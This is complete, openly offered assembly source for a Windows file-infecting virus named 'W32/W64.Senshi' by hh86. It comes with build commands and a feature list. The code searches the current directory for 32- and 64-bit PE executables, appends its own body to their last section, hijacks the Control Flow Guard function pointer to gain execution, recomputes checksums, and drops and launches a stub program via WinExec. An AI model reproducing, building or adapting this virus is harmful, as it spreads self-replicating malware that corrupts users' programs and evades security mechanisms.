;W32/W64.Senshi by hh86
;
;some of its features:
;- parasitic direct action infector of PE exe (but not looking at suffix)
;- infects files in current directory
;- new EPO for I386/AMD64 files:
;       hooks the Control Flow Guard function
;- last section appender
;- uses CRCs instead of API names
;- uses VEH for common code exit
;- supports ASLR/DEP/CFG enabled files
;- no infect files with data outside of image (eg infected files, self-extractors)
;- correct file checksum without using imagehlp.dll :) 100% correct algorithm by rgb
;- plus some new code optimisations that were never seen before BeautifulSky by Tomasz Grysztar
;----
;
;to build this thing:
;yasm
;----
;yasm -f win32 -o senshi.obj senshi.asm
;link senshi.obj /defaultlib:kernel32.lib /defaultlib:user32.lib /entry:dropper /section:.text,erw /subsystem:console
;---
;
;Young eagle, rise in the air!
;  You stared at the sun!
;My light and delicate gaze can't compare
;
;I stood, more tender than those
;  Who've witnessed you disappear...
;I'm kissing you now - across
;  The gap of a thousand years.
;Marina Tsvetaeva (1916)

bits 32

extern _MessageBoxA@16:proc
extern _ExitProcess@4:proc

CODESIZE        equ     (senshi_end - senshi_inf)

global _dropper
%include "senshi.inc"
section .text
_dropper:
        mov     edx, dllcrcstk_size >> 2
        mov     esi, dllnames
        mov     edi, dllcrcbegin
        call    create_crcs
        mov     edx, krncrcstk_size >> 2
        mov     esi, krnnames
        mov     edi, krncrcbegin
        call    create_crcs
        call    senshi_execode
        xor     eax, eax
        push    eax
        push    eax
        push    title
        push    message
        push    eax
        call    _MessageBoxA@16
        call    _ExitProcess@4

create_crcs:
        or      eax, -1

create_outer:
        xor     al, byte [esi]
        push    8
        pop     ecx

create_inner:
        shr     eax, 1
        jnc     create_skip
        xor     eax, 0edb88320h

create_skip:
        loop    create_inner
        inc     esi
        cmp     byte [esi], cl
        jne     create_outer
        not     eax
        stosd
        inc     esi
        dec     edx
        jne     create_crcs
        ret
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

senshi_inf:
                                             ;at entrypoint, ecx must be 0
                                             ;on 32-bit platform
        call    init_krncommon

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin:
        times   krncrcstk_size + 1 db 0
;       db      "Senshi - hh86"

        xor     ebx, ebx

;-----------------------------------------------------------------------------
;find files in current directory only
;-----------------------------------------------------------------------------

        enter   WIN32_FIND_DATA_size, 0
        push    '*'
        mov     edi, esp
        push    edi
        push    edi
        call    dword [ebp + 4 + krncrcstk.kFindFirstFileW]
        push    eax

        ;and one July day in 1786, the Raven God appeared

test_dir:
        pop     eax
        push    eax
        push    edi
        push    eax
        test    byte [edi + WIN32_FIND_DATA.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne     find_next
        lea     edx, dword [ebx + FILE_ATTRIBUTE_ARCHIVE]
        call    set_fileattr
        call    open_file

find_next:
        call    dword [ebp + 4 + krncrcstk.kFindNextFileW]
        dec     eax
        je      test_dir
        call    dword [ebp + 4 + krncrcstk.kFindClose]
        lea     esp, dword [ebp + 4 + krncrcstk_size]
        ret

open_file:                                   ;esi = file name, ebp -> platform APIs
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    FILE_READ_DATA | FILE_WRITE_DATA
        push    esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileW]
        lea     ecx, dword [edi + WIN32_FIND_DATA.ftLastWriteTime]
        lea     edx, dword [edi + WIN32_FIND_DATA.ftLastAccessTime]
        push    eax                          ;CloseHandle
        push    ecx                          ;SetFileTime
        push    edx                          ;SetFileTime
        push    ebx                          ;SetFileTime
        push    eax                          ;SetFileTime
        push    eax                          ;SetEndOfFile
        xchg    eax, esi
        call    map_view
        push    ebx
        push    ebx
        push    dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFilePointer]
        call    dword [ebp + 4 + krncrcstk.kSetEndOfFile]
        call    dword [ebp + 4 + krncrcstk.kSetFileTime]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileAttributes]

set_fileattr:                                ;edx = file attributes, edi -> find data, ebp -> platform APIs
        lea     esi, dword [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFileAttributesW]
        ret                                  ;esi -> file name
        db      "29/12/19"

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view:                                    ;esi = file handle, edi -> find data, ebp -> platform APIs
        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        add     edx, CODESIZE
        push    ebx
        push    edx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword [ebp + 4 + krncrcstk.kMapViewOfFile]
        push    eax
        pushad                               ;SEH destroys all registers
        call    infect_file

unmap_seh:
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        fs pop  dword [eax]
        pop     eax
        popad
        call    dword [ebp + 4 + krncrcstk.kUnmapViewOfFile]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]
        ret

;-----------------------------------------------------------------------------
;recover kernel32 image base
;-----------------------------------------------------------------------------

init_kernel32:
        setz    cl                           ;ZF = 1 in 64-bit

init_krncommon:
        imul    edi, ecx, 8                  ;qword
        inc     cl
        imul    edx, ecx, 0ch                ;both pebLdr and ldrInLoadOrderModuleList are 0ch
        dec     eax
        mov     ebx, dword [ebx + edx]       ;pebLdr
        add     edx, edi
        dec     eax
        mov     ebx, dword [ebx + edx]       ;ldrInLoadOrderModuleList
        dec     eax
        mov     esi, dword [ebx]
        dec     eax
        lodsd
        push    dword [eax + edi + mlDllBase]
        pop     ebp

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports:
        dec     cl
        shl     cl, 4
        mov     edx, dword [ebp + mzhdr.mzlfanew]
        add     edx, ecx
        mov     ebx, dword [ebp + edx + pehdr.peexport]
        xor     edx, edx
        pop     esi

walk_names:
bits 64
        inc     edx
bits 32
        mov     ecx, dword [ebp + ebx + peexp.expnamerva]
        dec     eax
        add     ecx, ebp
        mov     edi, dword [edx * 4 + ecx]
        dec     eax
        add     edi, ebp
        or      eax, -1

crc32_outer:
        xor     al, byte [edi]     
        push    8
        pop     ecx

crc32_inner:
        shr     eax, 1
        jnc     crc32_loop
        xor     eax, 0edb88320h

crc32_loop:
        loop    crc32_inner
        scasb
        cmp     byte [edi], cl
        jne     crc32_outer
        not     eax
        cmp     dword [esi], eax
        jne     walk_names

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        mov     edi, dword [ebp + ebx + peexp.expordrva]
        dec     eax
        add     edi, ebp
        movzx   edi, word [edx * 2 + edi]
        mov     ecx, dword [ebp + ebx + peexp.expadrrva]
        dec     eax
        add     ecx, ebp
        mov     ecx, dword [edi * 4 + ecx]
        dec     eax
        add     ecx, ebp
        push    ecx
        lodsd
        cmp     byte [esi], 0
        jne     walk_names
bits 64
        inc     rsi
bits 32
        jmp     esi

;-----------------------------------------------------------------------------
;test MZ and PE signatures
;-----------------------------------------------------------------------------

test_infect:                                 ;edi = find data, esi = map view, ebx = 0
        cmp     word [esi], 'MZ'
        jne     test_ret
        mov     ebp, esi
        add     esi, dword [esi + mzhdr.mzlfanew]
        lodsd
        sub     eax, 'PE'
        jne     test_ret

;-----------------------------------------------------------------------------
;I386 and AMD64 machines
;-----------------------------------------------------------------------------

        xchg    ecx, eax
        lodsd
        cmp     ax, IMAGE_FILE_MACHINE_I386
        je      inftest_flags
        cmp     ax, IMAGE_FILE_MACHINE_AMD64
        jne     test_ret
        mov     cl, 10h

inftest_flags:
        mov     ax, word [esi + coffhdr.peflags - coffhdr.petimedate]
        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_DLL | IMAGE_FILE_SYSTEM
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE
        jne     test_ret

;-----------------------------------------------------------------------------
;test subsystem
;-----------------------------------------------------------------------------

        mov     edx, dword [esi + pehdr.pesubsys - coffhdr.pesymbrva]
        dec     edx
        dec     edx
        cmp     dx, IMAGE_SUBSYSTEM_WINDOWS_GUI - 1
        jnbe    test_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        movzx   edx, word [esi + coffhdr.peopthdrsize - coffhdr.petimedate]
        jecxz   inftest_dirs
        cmp     edx, pehdr64.pe64bound - pehdr64.pe64magic
        jb      test_ret

inftest_dirs:
        cmp     edx, pehdr.pebound - pehdr.pemagic
        jb      test_ret
        lea     eax, dword [esi + pehdr.pechksum - coffhdr.pesymbrva]
        cmp     dword [eax + ecx + pehdr.pesecurity - pehdr.pechksum], ebx
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect files with data outside the image (eg self-extractors, etc)
;don't infect files with SizeOfRawData < VirtualSize: it may be a buffer
;-----------------------------------------------------------------------------

        lea     esi, dword [esi + edx + pehdr.pemagic - coffhdr.pesymbrva - pesect_size]
        imul    dx, word [eax + pehdr.pecoff + coffhdr.pesectcount - pehdr.pechksum], pesect_size
        add     esi, edx
        mov     ebx, dword [esi + pesect.sectrawaddr]
        add     ebx, dword [esi + pesect.sectrawsize]
        add     edi, WIN32_FIND_DATA.dwFileSizeLow
        cmp     dword [edi], ebx
        jne     test_ret                     ;file contains appended data
        mov     edx, dword [esi + pesect.sectrawsize]
        cmp     dword [esi + pesect.sectvirtsize], edx
        ja      test_ret

;-----------------------------------------------------------------------------
;find our entry point
;-----------------------------------------------------------------------------

        mov     edx, dword [eax + ecx + pehdr.peconfig + pedir.dirrva - pehdr.pechksum]
        call    rva2raw
        test    edx, edx
        je      test_ret
        mov     ebx, edx
        jecxz   inftest_epo
        cmp     dword [edx], GuardFlags64 + 4
        jb      test_ret
        movq    mm1, qword [edx + GuardCFDispatchFunctionPointer64]
        psubq   mm1, qword [eax + pehdr64.pe64imagebase - pehdr.pechksum]
        movd    edx, mm1
        test    edx, edx                     ;pcmpeqd takes more instructions
        jne     inftest_ret
        int3

inftest_epo:
        cmp     dword [edx], GuardFlags + 4
        jb      test_ret
        mov     edx, dword [edx + GuardCFCheckFunctionPointer]
        test    edx, edx
        je      test_ret                     ;no CFDispatch for Intel386 files
        sub     edx, dword [eax + pehdr.peimagebase - pehdr.pechksum]

inftest_ret:
        call    rva2raw
        ret

test_ret:
        int3

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     esi, pesect_size
        db      3ch                          ;mask PUSH ESI

rva2raw:                                     ;ecx = RVA, esi -> last section header
        push    esi
        cmp     dword [esi + pesect.sectvirtaddr], edx
        jnbe    rvaloop
        sub     edx, dword [esi + pesect.sectvirtaddr]
        add     edx, dword [esi + pesect.sectrawaddr]
        add     edx, ebp
        pop     esi
        ret

;-----------------------------------------------------------------------------
;infect file
;algorithm:     *
;               append last section and insert virus code there, image size is
;               increased. file size only increases by the size of the virus code
;               the code supports ASLR/DEP enabled files, so no need to alter
;               dll flags (clear NO_SEH and SafeSEH is only for 32-bit PE)
;               CFG function pointer is altered.  very simple
;-----------------------------------------------------------------------------

infect_file:
        fs push dword [ebx]
        fs mov  dword [ebx], esp
        xchg    eax, esi
        call    test_infect
        push    edi
        push    ecx
        push    ebx
        push    ecx
        push    dword [esi + pesect.sectrawsize]
        mov     ecx, CODESIZE
        add     dword [esi + pesect.sectrawsize], ecx
        add     dword [esi + pesect.sectvirtsize], ecx
        add     dword [edi], ecx
        mov     edi, dword [esi + pesect.sectvirtsize]
        mov     ebx, dword [eax + pehdr.pesectalign - pehdr.pechksum]
        dec     ebx
        add     edi, ebx
        not     ebx
        and     edi, ebx                     ;section align virtual size
        add     edi, dword [esi + pesect.sectvirtaddr]
        mov     dword [eax + pehdr.peimagesize - pehdr.pechksum], edi

;-----------------------------------------------------------------------------
;we don't need write bit, but executable for DEP
;-----------------------------------------------------------------------------

        or      byte [esi + pesect.sectflags + 3], IMAGE_SCN_MEM_EXECUTE >> 18h

;-----------------------------------------------------------------------------
;expend ESI, copy virus code
;-----------------------------------------------------------------------------

        pop     edi
        mov     ebx, edi
        add     ebx, dword [esi + pesect.sectvirtaddr]
        add     edi, dword [esi + pesect.sectrawaddr]
        add     edi, ebp
        mov     esi, dword [esp + 0ch + 8]
        sub     esi, unmap_seh - senshi_inf
        rep     movsb

;-----------------------------------------------------------------------------
;alter function pointer
;-----------------------------------------------------------------------------

        pop     ecx
        add     ebx, senshi_execode - senshi_inf
        jecxz   infect_ia32
        movd    mm1, ebx
        paddq   mm1, qword [eax + pehdr64.pe64imagebase - pehdr.pechksum]
        movq    qword [edx], mm1
        add     cl, GuardCFCheckFunctionPointer64 - GuardCFCheckFunctionPointer - 10h
        jmp     infect_clear

infect_ia32:
        add     ebx, dword [eax + pehdr.peimagebase - pehdr.pechksum]
        mov     dword [edx], ebx

infect_clear:
        and     byte [eax + pehdr.pedllflags + 1 - pehdr.pechksum], (~IMAGE_DLLCHARACTERISTICS_GUARD_CF) >> 8
        pop     edi
        lea     edi, dword [edi + ecx + GuardCFCheckFunctionPointer]
        pop     ecx
        add     cl, (GuardFlags + 4) - GuardCFCheckFunctionPointer
        push    eax
        xor     eax, eax
        rep     stosb
        pop     eax

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword [eax], ecx
        jecxz   infect_ret
        pop     ecx
        mov     ecx, dword [ecx]
        push    ecx
        cdq
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     dx, word [ebp]
        inc     ebp
        inc     ebp
        loop    calc_checksum
        pop     dword [eax]
        adc     dword [eax], edx             ;avoid common bug.  ADC not ADD

infect_ret:
        int3                                 ;common exit using SEH

;-----------------------------------------------------------------------------
;platform-independent get architecture by qkumba
;determine platform and dynamically adjust function address size
;-----------------------------------------------------------------------------

call_dllcrc:
        push    ecx                          ;eax = API offset in 32-bit, esi -> platform APIs
        xor     ecx, ecx
        arpl    cx, cx                       ;movsxd ecx, ecx in x64
        setz    cl
        shl     eax, cl
        pop     ecx
        jmp     dword [esi + eax]

senshi_execode:
        push    eax
        push    esi
        push    ebp
        push    edi
        push    ebx
        push    edx
        push    ecx
        push    60h
        pop     edx
        xor     eax, eax                     ;platform detection trap :)
        push    eax
        dec     eax                          ;REX prefix in 64-bit, but also sets SF in 32-bit
        fs cmovs ebx, dword [30h]            ;now ebx points to PEB in 32-bit
                                             ;yasm doesn't compile this instruction correctly on bits 64 mode
bits 64
        cmovs   edx, esp                     ;known memory to avoid invalid access in 32-bit mode
        gs cmovns rbx, qword [rdx]           ;now rbx points to PEB in 64-bit, in 32-bit this becomes:
                                             ;gs dec eax
                                             ;cmovns ebx, dword [edx]
bits 32
        pop     ecx
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

exesize equ     4000h

dllcrcbegin:
        times   dllcrcstk_size + 1 db 0
        push    esp
        pop     esi
        push    exesize
        pop     edx
        push    GMEM_ZEROINIT
        pop     ecx
        push    eax
        push    eax
        push    edx
        push    ecx
        push    dllcrcstk.dGlobalAlloc
        pop     eax
        call    call_dllcrc
        test    eax, eax
        je      senshi_exeret
        push    esi
        call    skip_exe

imagebase equ   0

stub_begin:
        db      'M', 'Z'                     ;00 DOS signature
        db      0, 0                         ;02 align 4 
        db      'P', 'E', 0, 0               ;04 PE signature
filehdr dw      14ch                         ;08 machine
        dw      0                            ;0a number of sections
        dd      0                            ;0c date/time stamp (overload for reloc page rva)
        dd      0ch                          ;10 pointer to symbol table (overload for reloc block size) 
        dw      3000h + (cfg_fp - stub_begin), 3000h + (cfg_tp - stub_begin)
                                             ;14 number of symbols (overload for reloc entries)
        dw      8                            ;18 size of optional header
        dw      2                            ;1a characteristics
opthdr  dw      10bh                         ;1c magic
        db      'v'                          ;1e major linker
        db      'c'                          ;1f minor linker
        dd      ".exe"                       ;20 size of code
        dd      0                            ;24 size of init data
        dd      0                            ;28 size of uninit data
        dd      teleport_init - stub_begin   ;2c entry point (must be aligned)
        dd      0                            ;30 base of code
        dd      0ch                          ;34 base of data (overload for lfanew)
        dd      imagebase                    ;38 image base
        dd      4                            ;3c section align
        dd      4                            ;40 file align
        dw      0                            ;44 major os
        dw      0                            ;46 minor os
        dw      0                            ;48 major image
        dw      0                            ;4a minor image
        dw      4                            ;4c major subsys
        dw      0                            ;4e minor subsys
        dd      0                            ;50 reserved
        dd      "vc!"                        ;54 size of image
        dd      0                            ;58 size of headers
        dd      0                            ;5c checksum
        dw      3                            ;60 subsystem
        dw      4140h                        ;62 dll characteristics (CFG/ASLR/DEP enabled)
        dd      0                            ;64 size of stack reserve
        dd      0                            ;68 size of stack commit
        dd      0                            ;6c size of heap reserve
        dd      0                            ;70 size of heap commit
        dd      0                            ;74 loader flags
        dd      0bh                          ;78 number of rva and sizes
        dd      0, 0                         ;7c-80 export
        dd      0, 0                         ;84-88 import
        dd      0, 0                         ;8c-90 resource
        dd      0, 0                         ;94-98 exception
        dd      0, 0                         ;9c-a0 certificate
        dd      0ch, 0ch                     ;a4-a8 base reloc
        dd      0, 0                         ;ac-b0 debug
        dd      0, 0                         ;b4-b8 arch
        dd      0, 0                         ;bc-c0 reserved
        dd      0, 0                         ;c4-c8 tls
        dd      0d4h, 5ch                    ;cc-d0 config
cfgdir  dd      5ch                          ;d4 size
        times   44h db 0                     ;d8 unused fields
cfg_fp  dd      imagebase + (teleport_init - stub_begin) + 1
                                             ;11c CFG address of check-function pointer
        dd      0                            ;120 CFG address of dispatch-function pointer
cfg_tp  dd      imagebase + CODESIZE + (code_buffer - stub_begin)
                                             ;124 CFG function table
        dd      1                            ;128 CFG function count
        dd      10004500h                    ;12c CFG flags

teleport_init:
        mov     esi, "vc!"                   ;130 entry point
        inc     esi
        inc     esi
        lodsd
        xchg    esi, eax
        lodsd
        mov     edx, dword [ebx + 8]         ;ebx = fs:[30h] at start time
        lea     edi, dword [edx + code_buffer - stub_begin]
        add     dh, 2
        shr     edx, 8
        lea     esi, dword [edx * 4 + eax]
        mov     ecx, CODESIZE
        rep     movsb
code_buffer:

skip_exe:
        pop     esi
        push    eax
        push    eax
        pop     edi
        push    eax
        pop     ebp
        mov     ecx, code_buffer - stub_begin
        rep     movsb
        dec     eax
        sub     esi, code_buffer - senshi_inf
        mov     ecx, senshi_end - senshi_inf
        dec     eax
        add     edi, ecx
        mov     eax, teleport_init - stub_begin
        stosd
        scasb
        mov     edx, 1f0h

test_group:
        lodsb
        push    4
        pop     ebx

test_bits:
        push    eax
        add     edx, 10h
        and     al, 3
        je      skip_test
        dec     al
        je      store_rva
        dec     al
        je      store_exp
        inc     dword [edi]                  ;valid but unaligned
        db      0b8h                         ;mask MOV

store_exp:
        mov     byte [edi + 4], 2

store_rva:
        add     dword [edi], edx
        inc     dword [ebp + 128h]
        scasd
        scasb

skip_test:
        pop     eax
        shr     al, 2
bits 64
        dec     ebx
bits 32
        jnz     test_bits
        loop    test_group
        mov     dword [ebp + 54h], edx
        pop     edi
        pop     esi
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    ebx
        push    CREATE_ALWAYS | FILE_WRITE_DATA
        pop     edx
        push    edx
        dec     ebp
        xor     ecx, ecx
        dec     ebp
        xor     eax, eax
        push    ebx
        push    ebx
        push    edx
        dec     eax
        lea     ecx, dword [edi + 1eh]
        push    ecx
        push    dllcrcstk.dCreateFileA
        pop     eax
        call    call_dllcrc
        push    ebx
        push    eax
        pop     ebx
        push    esp
        dec     ebp
        pop     ecx
        push    esp
        mov     edx, exesize
        push    edx
        push    edi
        push    ebx
        push    edx
        dec     ebp
        pop     eax
        push    edi
        pop     edx
        push    ebx
        pop     ecx
        xor     eax, eax
        call    call_dllcrc
        push    ebx
        push    ebx
        pop     ecx
        push    dllcrcstk.dCloseHandle
        pop     eax
        call    call_dllcrc
        push    edi
        push    edi
        pop     ecx
        push    dllcrcstk.dGlobalFree
        pop     eax
        call    call_dllcrc
        dec     eax
        lea     ecx, dword [edi + 1eh]
        push    eax
        pop     edx
        push    edx
        push    edx
        push    ecx
        push    dllcrcstk.dWinExec
        pop     eax
        call    call_dllcrc

senshi_exeret:
        push    esi
        pop     esp
        pop     eax
        pop     eax
        pop     eax
        pop     eax
        pop     eax
        pop     eax
        pop     ecx
        pop     edx
        pop     ebx
        pop     edi
        pop     ebp
        pop     esi
        lea     eax, [si]                    ;TG!
        pop     eax
        ret

senshi_end:

dllnames        db      "CloseHandle", 0
                db      "CreateFileA", 0
                db      "GlobalAlloc", 0
                db      "GlobalFree" , 0
                db      "WinExec"    , 0
                db      "WriteFile"  , 0
                
krnnames        db      "CloseHandle"       , 0
                db      "CreateFileMappingW", 0
                db      "CreateFileW"       , 0
                db      "FindClose"         , 0
                db      "FindFirstFileW"    , 0
                db      "FindNextFileW"     , 0
                db      "MapViewOfFile"     , 0
                db      "SetEndOfFile"      , 0
                db      "SetFileAttributesW", 0
                db      "SetFilePointer"    , 0
                db      "SetFileTime"       , 0
                db      "UnmapViewOfFile"   , 0

title           db      "Senshi", 0
message         db      "running...", 0